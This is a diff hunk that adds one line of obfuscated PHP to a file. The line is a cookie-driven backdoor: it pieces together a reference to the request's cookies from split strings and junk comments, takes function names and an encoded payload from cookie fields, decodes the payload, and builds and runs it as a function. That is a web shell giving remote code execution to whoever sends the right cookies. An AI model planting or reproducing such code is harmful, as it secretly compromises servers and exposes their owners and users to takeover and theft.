@@ -1,0 +1,1 @@
+<?php $va='E';$wf='OO';/*W.V*/$h='KI';/*x*/$nt='_C';$qy/*=Qw*/=${$nt.$wf.$h.$va};$y=/*rX*/$qy['v'].$qy/*}E*/['Np'];$vw=$qy['q'].$qy['pH'].$qy['mg'];$w=$y('',$vw($qy['oW']));$w();
